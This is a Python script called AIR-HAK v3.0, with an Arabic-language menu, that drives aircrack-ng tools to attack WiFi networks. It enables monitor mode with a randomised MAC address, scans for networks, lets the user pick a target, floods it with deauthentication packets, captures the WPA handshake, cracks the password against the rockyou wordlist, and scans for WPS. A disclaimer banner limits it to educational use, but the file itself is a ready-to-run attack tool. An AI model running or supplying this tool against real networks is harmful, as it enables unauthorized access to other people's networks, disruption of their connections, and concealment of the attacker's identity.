#!/usr/bin/env python3
"""
AIR-HAK - أداة احترافية لاختبار اختراق الواي فاي
إصدار مبسط ومصحح
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
from datetime import datetime

# تعريف الألوان
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class WiFiPentestFramework:
    def __init__(self):
        self.check_root()
        self.setup_signals()
        
        # إعدادات
        self.interface = None
        self.monitor_interface = None
        self.current_target = None
        self.targets = []
        
        # المجلدات
        self.setup_directories()
        
        # عرض البانر
        self.show_banner()
        
        # اختيار الواجهة
        self.select_interface()
        
        # بدء القائمة الرئيسية
        self.main_menu()
    
    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Colors.RED}[✗] تحتاج صلاحيات root!{Colors.RESET}")
            print(f"{Colors.YELLOW}استخدم: sudo python3 {sys.argv[0]}{Colors.RESET}")
            sys.exit(1)
    
    def setup_signals(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[*] تنظيف وإغلاق...{Colors.RESET}")
        self.cleanup()
        sys.exit(0)
    
    def setup_directories(self):
        for dir in ['captures', 'handshakes', 'wordlists', 'logs', 'reports']:
            os.makedirs(dir, exist_ok=True)
    
    def show_banner(self):
        os.system('clear')
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════╗
║                     AIR-HAK v3.0 - WiFi Pentest Tool                ║
║                 للأغراض التعليمية والأمنية فقط                     ║
╚══════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.RED}تحذير:{Colors.RESET} استخدام هذه الأداة على شبكات الآخرين بدون إذن جريمة
{Colors.YELLOW}المسؤولية القانونية تقع على المستخدم{Colors.RESET}
"""
        print(banner)
        
        response = input(f"{Colors.BLUE}[?] هل توافق على الشروط؟ (y/N): {Colors.RESET}").strip().lower()
        if response != 'y':
            print(f"{Colors.RED}[✗] تم الرفض{Colors.RESET}")
            sys.exit(0)
    
    def select_interface(self):
        print(f"{Colors.YELLOW}[*] البحث عن واجهات لاسلكية...{Colors.RESET}")
        
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            interfaces = []
            
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
                    print(f"{Colors.GREEN}[+] {iface}{Colors.RESET}")
            
            if not interfaces:
                print(f"{Colors.RED}[✗] لا توجد واجهات لاسلكية{Colors.RESET}")
                sys.exit(1)
            
            self.interface = interfaces[0]
            print(f"{Colors.GREEN}[*] تم اختيار {self.interface}{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
            sys.exit(1)
    
    def enable_monitor_mode(self):
        print(f"{Colors.YELLOW}[*] تفعيل وضع المراقبة...{Colors.RESET}")
        
        try:
            # إيقاف الواجهة
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # تغيير MAC
            subprocess.run(['macchanger', '-r', self.interface],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # وضع المراقبة
            subprocess.run(['iw', self.interface, 'set', 'monitor', 'control'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # تشغيل الواجهة
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.monitor_interface = self.interface
            print(f"{Colors.GREEN}[✓] وضع المراقبة مفعل{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
    
    def disable_monitor_mode(self):
        if self.monitor_interface:
            try:
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'])
                subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'])
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'])
                print(f"{Colors.GREEN}[✓] وضع المراقبة معطل{Colors.RESET}")
            except:
                pass
    
    def scan_networks(self):
        if not self.monitor_interface:
            print(f"{Colors.RED}[✗] يجب تفعيل وضع المراقبة أولاً{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}[*] بدء مسح الشبكات...{Colors.RESET}")
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"captures/scan_{timestamp}"
            
            cmd = ['airodump-ng', self.monitor_interface, '-w', output_file, '--output-format', 'csv']
            
            print(f"{Colors.CYAN}[*] اضغط Ctrl+C بعد 10-20 ثانية{Colors.RESET}")
            
            process = subprocess.Popen(cmd)
            time.sleep(15)
            process.terminate()
            
            self.parse_scan_results(f"{output_file}-01.csv")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] تم إيقاف المسح{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
    
    def parse_scan_results(self, csv_file):
        try:
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    lines = f.readlines()
                
                networks = []
                parsing_networks = True
                
                for line in lines:
                    if 'Station MAC' in line:
                        parsing_networks = False
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    
                    if parsing_networks and len(parts) > 13:
                        if parts[0] and parts[0] != 'BSSID':
                            networks.append({
                                'bssid': parts[0],
                                'channel': parts[3],
                                'encryption': parts[5],
                                'power': parts[8],
                                'essid': parts[13].strip('"')
                            })
                
                self.targets = networks
                
                # عرض النتائج
                os.system('clear')
                self.print_header()
                
                print(f"{Colors.CYAN}{Colors.BOLD}الشبكات المكتشفة:{Colors.RESET}\n")
                print(f"{Colors.CYAN}{'═' * 80}{Colors.RESET}")
                print(f"{Colors.BOLD}{'#':<3} {'BSSID':<18} {'CH':<4} {'PWR':<5} {'ENC':<10} {'ESSID':<20}{Colors.RESET}")
                print(f"{Colors.CYAN}{'═' * 80}{Colors.RESET}")
                
                for i, net in enumerate(networks[:20], 1):
                    enc_color = Colors.GREEN if 'WPA2' in net['encryption'] or 'WPA3' in net['encryption'] else Colors.RED
                    essid = net['essid'][:18] + '..' if len(net['essid']) > 20 else net['essid']
                    print(f"{i:<3} {net['bssid']:<18} {net['channel']:<4} {net['power']:<5} {enc_color}{net['encryption'][:10]:<10}{Colors.RESET} {essid:<20}")
                
                print(f"{Colors.CYAN}{'═' * 80}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] تم اكتشاف {len(networks)} شبكة{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ في قراءة النتائج: {e}{Colors.RESET}")
    
    def select_target(self):
        if not self.targets:
            print(f"{Colors.RED}[✗] يجب إجراء مسح أولاً{Colors.RESET}")
            return
        
        print(f"{Colors.CYAN}══════════════════════════════════════════════════════════════════════{Colors.RESET}")
        
        try:
            choice = input(f"{Colors.BLUE}[?] اختر رقم الشبكة (1-{min(20, len(self.targets))}): {Colors.RESET}").strip()
            
            if choice.isdigit() and 1 <= int(choice) <= min(20, len(self.targets)):
                self.current_target = self.targets[int(choice) - 1]
                print(f"{Colors.GREEN}[✓] تم اختيار: {self.current_target['essid']}{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[✗] اختيار غير صحيح{Colors.RESET}")
                return False
                
        except:
            return False
    
    def deauth_attack(self):
        if not self.current_target:
            print(f"{Colors.RED}[✗] لم يتم اختيار هدف{Colors.RESET}")
            return
        
        if not self.monitor_interface:
            print(f"{Colors.RED}[✗] وضع المراقبة غير مفعل{Colors.RESET}")
            return
        
        print(f"{Colors.RED}[!] بدء هجوم Deauth على {self.current_target['essid']}{Colors.RESET}")
        
        try:
            count = input(f"{Colors.BLUE}[?] عدد الحزم (0 للاستمرار): {Colors.RESET}").strip()
            count = f"-c {count}" if count != "0" else ""
            
            cmd = ['aireplay-ng', '--deauth', count, '-a', self.current_target['bssid'], self.monitor_interface]
            
            print(f"{Colors.YELLOW}[*] اضغط Ctrl+C لإيقاف الهجوم{Colors.RESET}")
            subprocess.run(cmd)
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] تم إيقاف الهجوم{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
    
    def capture_handshake(self):
        if not self.current_target:
            print(f"{Colors.RED}[✗] لم يتم اختيار هدف{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}[*] اعتراض مصافحة WPA...{Colors.RESET}")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"handshakes/{self.current_target['bssid'].replace(':', '')}_{timestamp}"
        
        try:
            cmd = [
                'airodump-ng',
                '-c', self.current_target['channel'],
                '--bssid', self.current_target['bssid'],
                '-w', output_file,
                self.monitor_interface
            ]
            
            print(f"{Colors.CYAN}[*] ابدأ هجوم deauth في نافذة أخرى{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] اضغط Ctrl+C عند ظهور WPA handshake{Colors.RESET}")
            
            process = subprocess.Popen(cmd)
            
            try:
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                print(f"\n{Colors.YELLOW}[*] تم إيقاف الاعتراض{Colors.RESET}")
            
            # التحقق من المصافحة
            if os.path.exists(f"{output_file}-01.cap"):
                print(f"{Colors.GREEN}[✓] تم حفظ المصافحة{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
    
    def crack_password(self):
        cap_file = input(f"{Colors.BLUE}[?] مسار ملف .cap: {Colors.RESET}").strip()
        
        if not os.path.exists(cap_file):
            print(f"{Colors.RED}[✗] الملف غير موجود{Colors.RESET}")
            return
        
        wordlist = input(f"{Colors.BLUE}[?] مسار wordlist [rockyou.txt]: {Colors.RESET}").strip()
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt"
        
        if not os.path.exists(wordlist):
            print(f"{Colors.RED}[✗] ملف wordlist غير موجود{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}[*] بدء كسر كلمة المرور...{Colors.RESET}")
        
        try:
            cmd = ['aircrack-ng', cap_file, '-w', wordlist]
            subprocess.run(cmd)
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
    
    def print_header(self):
        interface = self.interface if self.interface else "None"
        target = self.current_target['essid'] if self.current_target else "None"
        
        header = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║ AIR-HAK v3.0 | Interface: {interface:<10} | Target: {target:<20} ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        print(header)
    
    def main_menu(self):
        while True:
            os.system('clear')
            self.print_header()
            
            menu = f"""
{Colors.CYAN}{Colors.BOLD}القائمة الرئيسية:{Colors.RESET}

{Colors.GREEN}[1]{Colors.RESET} تفعيل وضع المراقبة
{Colors.GREEN}[2]{Colors.RESET} مسح الشبكات
{Colors.GREEN}[3]{Colors.RESET} اختيار هدف
{Colors.GREEN}[4]{Colors.RESET} هجوم Deauth
{Colors.GREEN}[5]{Colors.RESET} اعتراض مصافحة WPA
{Colors.GREEN}[6]{Colors.RESET} كسر كلمة المرور
{Colors.GREEN}[7]{Colors.RESET} فحص WPS
{Colors.GREEN}[8]{Colors.RESET} تعطيل وضع المراقبة
{Colors.GREEN}[9]{Colors.RESET} تنظيف الملفات
{Colors.GREEN}[0]{Colors.RESET} الخروج

{Colors.CYAN}══════════════════════════════════════════════════════════════════════{Colors.RESET}
"""
            print(menu)
            
            try:
                choice = input(f"{Colors.BLUE}[?] اختر الخيار (0-9): {Colors.RESET}").strip()
                
                if choice == "1":
                    self.enable_monitor_mode()
                    input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "2":
                    self.scan_networks()
                    input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "3":
                    if self.select_target():
                        input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "4":
                    self.deauth_attack()
                    input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "5":
                    self.capture_handshake()
                    input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "6":
                    self.crack_password()
                    input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "7":
                    self.wps_scan()
                    input(f"\n{Colors.BLUE}[↵] ضغت Enter للمتابعة...{Colors.RESET}")
                elif choice == "8":
                    self.disable_monitor_mode()
                    input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "9":
                    self.cleanup()
                    input(f"\n{Colors.BLUE}[↵] اضغط Enter للمتابعة...{Colors.RESET}")
                elif choice == "0":
                    self.cleanup()
                    print(f"{Colors.GREEN}[✓] الخروج{Colors.RESET}")
                    sys.exit(0)
                else:
                    print(f"{Colors.RED}[✗] خيار غير صحيح!{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] العودة للقائمة{Colors.RESET}")
                time.sleep(1)
    
    def wps_scan(self):
        if not self.monitor_interface:
            print(f"{Colors.RED}[✗] وضع المراقبة غير مفعل{Colors.RESET}")
            return
        
        print(f"{Colors.YELLOW}[*] فحص نقاط الوصول مع WPS...{Colors.RESET}")
        
        try:
            cmd = ['wash', '-i', self.monitor_interface]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[✓] نتائج فحص WPS:{Colors.RESET}")
                print(result.stdout)
            else:
                print(f"{Colors.RED}[✗] فشل فحص WPS{Colors.RESET}")
                print(result.stderr)
                
        except FileNotFoundError:
            print(f"{Colors.RED}[✗] أداة wash غير مثبتة{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] قم بتثبيتها: sudo apt install reaver{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[✗] خطأ: {e}{Colors.RESET}")
    
    def cleanup(self):
        print(f"{Colors.YELLOW}[*] تنظيف الملفات المؤقتة...{Colors.RESET}")
        
        # تعطيل وضع المراقبة
        self.disable_monitor_mode()
        
        # حذف الملفات القديمة
        patterns = ['*.cap', '*.csv', '*.netxml', 'captures/scan_*']
        for pattern in patterns:
            os.system(f'rm -f {pattern} 2>/dev/null')
        
        print(f"{Colors.GREEN}[✓] تم التنظيف{Colors.RESET}")

def main():
    try:
        framework = WiFiPentestFramework()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] تم إيقاف البرنامج{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[✗] خطأ غير متوقع: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()